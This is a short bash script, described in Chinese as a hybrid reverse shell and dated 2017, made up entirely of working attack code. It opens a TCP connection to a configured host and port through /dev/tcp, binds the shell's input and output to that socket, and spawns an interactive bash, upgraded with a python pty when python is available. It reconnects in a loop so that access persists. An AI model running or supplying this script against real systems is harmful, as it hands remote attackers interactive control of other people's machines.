#!/bin/bash

# >  desc: bash反弹shell混合版
# >  author: s0nnet
# >  time: 2017-01-20


function reverse_shell()
{
    ip=127.0.0.1
    port=8089
    sleep_tm=1

    while [ 1 ]
    do {
        exec 9<> /dev/tcp/$ip/$port
        [ $? -ne 0 ] && exit 0 || exec 0<&9;exec 1>&9 2>&1
        if type python >/dev/null; then
            python -c 'import pty; pty.spawn("/bin/bash")'
        else
            /bin/bash --refile "welcome!" --noprofile -i
        fi
    }&
    wait

    sleep $((RANDOM%sleep_tm))

    done
}

reverse_shell
